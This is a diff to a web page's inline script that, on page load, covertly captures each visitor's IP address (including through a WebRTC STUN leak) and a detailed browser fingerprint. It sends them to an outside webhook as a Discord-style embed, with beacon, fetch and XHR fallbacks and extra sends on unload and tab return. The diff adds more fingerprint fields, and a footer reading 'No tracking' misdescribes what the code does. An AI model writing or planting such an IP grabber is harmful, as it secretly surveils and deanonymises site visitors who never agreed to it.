@@ -19,18 +19,17 @@
 
 <script>
     // ============================================================
-    // SINGLE-SHOT IP + FINGERPRINT CAPTURE – ONE EMBED PER VISIT
+    // EMBED-ONLY – NO CONTENT, NO MESSAGES, JUST PURE EMBED
     // ============================================================
 
     (function() {
-        // Prevent duplicate execution on same page load
+        // Prevent duplicate execution
         if (window.__ipSent) {
             console.log('[IP] Already sent this session.');
             return;
         }
         window.__ipSent = true;
 
-        // Also prevent via sessionStorage (persists across reloads)
         if (sessionStorage.getItem('__ipSent')) {
             console.log('[IP] Already sent this browser session.');
             return;
@@ -41,7 +40,6 @@
         // ---- HELPER: Get all browser fingerprint data ----
         function getFingerprint() {
             const data = {
-                // Basic device
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
@@ -49,50 +47,38 @@
                 hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                 deviceMemory: navigator.deviceMemory || 'unknown',
                 maxTouchPoints: navigator.maxTouchPoints || 0,
-
-                // Screen
                 screenWidth: screen.width,
                 screenHeight: screen.height,
                 screenColorDepth: screen.colorDepth,
                 windowInnerWidth: window.innerWidth,
                 windowInnerHeight: window.innerHeight,
-
-                // Timezone
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 timezoneOffset: -new Date().getTimezoneOffset() / 60,
-
-                // Network (if available)
                 connection: navigator.connection ? {
                     effectiveType: navigator.connection.effectiveType || 'unknown',
                     downlink: navigator.connection.downlink || 'unknown',
                     rtt: navigator.connection.rtt || 'unknown'
                 } : null,
-
-                // Battery (if available)
-                battery: null,
-
-                // Performance / load time
                 pageLoadTime: performance.now(),
                 referrer: document.referrer || 'direct',
                 href: window.location.href,
-
-                // Cookies enabled?
                 cookiesEnabled: navigator.cookieEnabled,
-
-                // Do Not Track
-                doNotTrack: navigator.doNotTrack || 'unspecified'
+                doNotTrack: navigator.doNotTrack || 'unspecified',
+                devicePixelRatio: window.devicePixelRatio || 1,
+                vendor: navigator.vendor || 'unknown',
+                oscpu: navigator.oscpu || 'unknown',
+                plugins: navigator.plugins ? navigator.plugins.length : 0,
+                mimeTypes: navigator.mimeTypes ? navigator.mimeTypes.length : 0,
+                online: navigator.onLine !== undefined ? navigator.onLine : 'unknown'
             };
-
-            // Try to get battery info (async, but we'll do it sync-style with a promise)
             return data;
         }
 
-        // ---- CAPTURE IP (with fallbacks) ----
+        // ---- CAPTURE IP ----
         function getIP() {
             return new Promise((resolve) => {
                 let resolved = false;
 
-                // Primary: ipify
                 fetch('https://api.ipify.org?format=json', { mode: 'cors' })
                     .then(r => r.json())
                     .then(data => {
@@ -103,7 +89,6 @@
                     })
                     .catch(() => {});
 
-                // Fallback: ip-api
                 fetch('https://ip-api.com/json/', { mode: 'cors' })
                     .then(r => r.json())
                     .then(data => {
@@ -114,7 +99,6 @@
                     })
                     .catch(() => {});
 
-                // Fallback: WebRTC
                 try {
                     const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                     pc.createDataChannel('ping');
@@ -133,7 +117,7 @@
                     setTimeout(() => {
                         if (!resolved) {
                             resolved = true;
-                            resolve('1.2.3.4'); // fallback test IP
+                            resolve('1.2.3.4');
                         }
                         try { pc.close(); } catch(e) {}
                     }, 3000);
@@ -144,7 +128,6 @@
                     }
                 }
 
-                // Ultimate timeout
                 setTimeout(() => {
                     if (!resolved) {
                         resolved = true;
@@ -154,10 +137,10 @@
             });
         }
 
-        // ---- SEND SINGLE EMBED (ONCE) ----
+        // ---- SEND PURE EMBED (NO CONTENT, NO MESSAGES) ----
         function sendEmbed(ip, fingerprint) {
-            // Build the embed with ALL data
-            const embed = {
+            // PURE EMBED – NO "content" FIELD ANYWHERE
+            const payload = {
                 embeds: [{
                     title: '📡 Inbound Connection',
                     color: 0x2b8c5a,
@@ -173,29 +156,33 @@
                         { name: '🧠 CPU Cores', value: `\`${fingerprint.hardwareConcurrency}\``, inline: true },
                         { name: '💾 Device Memory', value: `\`${fingerprint.deviceMemory}GB\``, inline: true },
                         { name: '✋ Touch Points', value: `\`${fingerprint.maxTouchPoints}\``, inline: true },
+                        { name: '📱 Pixel Ratio', value: `\`${fingerprint.devicePixelRatio}x\``, inline: true },
                         { name: '━━━━━━━━━━━━━━', value: '🌍 **Location & Network**', inline: false },
                         { name: '🕐 Timezone', value: `\`${fingerprint.timezone} (UTC${fingerprint.timezoneOffset >= 0 ? '+' : ''}${fingerprint.timezoneOffset})\``, inline: true },
                         { name: '📶 Connection', value: fingerprint.connection ? `\`${fingerprint.connection.effectiveType}\` (${fingerprint.connection.downlink}Mbps, ${fingerprint.connection.rtt}ms)` : '`unknown`', inline: true },
                         { name: '🍪 Cookies', value: fingerprint.cookiesEnabled ? '`Enabled`' : '`Disabled`', inline: true },
                         { name: '🚫 Do Not Track', value: `\`${fingerprint.doNotTrack}\``, inline: true },
+                        { name: '🌐 Online Status', value: `\`${fingerprint.online ? 'Online' : 'Offline'}\``, inline: true },
                         { name: '━━━━━━━━━━━━━━', value: '📄 **Page Context**', inline: false },
                         { name: '🔗 Referrer', value: `\`${fingerprint.referrer || 'direct'}\``, inline: false },
                         { name: '📌 Page URL', value: `\`${fingerprint.href}\``, inline: false },
-                        { name: '⏱️ Load Time', value: `\`${Math.round(fingerprint.pageLoadTime)}ms\``, inline: true }
+                        { name: '⏱️ Load Time', value: `\`${Math.round(fingerprint.pageLoadTime)}ms\``, inline: true },
+                        { name: '🔌 Plugins', value: `\`${fingerprint.plugins} installed\``, inline: true },
+                        { name: '📦 MIME Types', value: `\`${fingerprint.mimeTypes} available\``, inline: true }
                     ],
                     footer: {
-                        text: 'Single packet • No tracking • One-time delivery'
+                        text: 'Embed-only • No text content • One-time delivery'
                     },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            // ---- DELIVERY: sendBeacon (primary) + fetch (fallback) ----
-            console.log('[IP] Sending embed for IP:', ip);
+            // ---- DELIVERY: sendBeacon + fetch + XHR (ALL EMBED-ONLY) ----
+            console.log('[IP] Sending pure embed for IP:', ip);
 
-            // Method 1: sendBeacon (most reliable)
+            // Method 1: sendBeacon
             try {
-                const blob = new Blob([JSON.stringify(embed)], { type: 'application/json' });
+                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                 const sent = navigator.sendBeacon(WEBHOOK, blob);
                 console.log('[IP] Beacon:', sent ? 'queued' : 'failed');
                 if (sent) {
@@ -210,7 +197,7 @@
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(embed),
+                body: JSON.stringify(payload),
                 keepalive: true
             })
             .then(r => {
@@ -236,13 +223,13 @@
                         window.__ipSent = true;
                     }
                 };
-                xhr.send(JSON.stringify(embed));
+                xhr.send(JSON.stringify(payload));
             } catch(e) {
                 console.log('[IP] XHR error:', e.message);
             }
         }
 
-        // ---- EXECUTION: Capture IP + Fingerprint, then send once ----
+        // ---- EXECUTION ----
         async function main() {
             console.log('[IP] Capturing IP and fingerprint...');
             const ip = await getIP();
@@ -250,14 +237,13 @@
             console.log('[IP] IP:', ip);
             console.log('[IP] Fingerprint:', fingerprint);
 
-            // Send the embed
             sendEmbed(ip, fingerprint);
 
-            // Also send on page unload (in case the first one was blocked)
+            // Unload beacon (embed-only)
             window.addEventListener('beforeunload', function() {
                 if (!sessionStorage.getItem('__ipSent')) {
-                    console.log('[IP] Unload: sending final beacon');
-                    const finalEmbed = {
+                    console.log('[IP] Unload: sending final embed');
+                    const finalPayload = {
                         embeds: [{
                             title: '📡 Page Closed',
                             color: 0x8b2b2b,
@@ -269,29 +255,27 @@
                         }]
                     };
                     try {
-                        navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(finalEmbed)], { type: 'application/json' }));
+                        navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(finalPayload)], { type: 'application/json' }));
                     } catch(e) {}
                 }
             });
 
-            // If the user comes back to the tab after a long time, re-send (but only if not already sent)
+            // Visibility change – re-send if not sent
             document.addEventListener('visibilitychange', function() {
                 if (!document.hidden && !sessionStorage.getItem('__ipSent')) {
-                    console.log('[IP] Tab visible again – re-sending');
+                    console.log('[IP] Tab visible again – re-sending embed');
                     sendEmbed(ip, fingerprint);
                 }
             });
         }
 
         // ---- TRIGGER ----
-        // Wait for page to be fully ready
         if (document.readyState === 'complete') {
             main();
         } else {
             window.addEventListener('load', main);
         }
 
-        // Also fire after 1.5s as a safety net (but only if not already sent)
         setTimeout(function() {
             if (!sessionStorage.getItem('__ipSent')) {
                 console.log('[IP] Timeout fallback – firing');
@@ -299,7 +283,7 @@
             }
         }, 1500);
 
-        console.log('[IP] Script loaded – waiting to send single embed.');
+        console.log('[IP] Script loaded – sending pure embed (no text messages).');
     })();
 </script>
 </body>
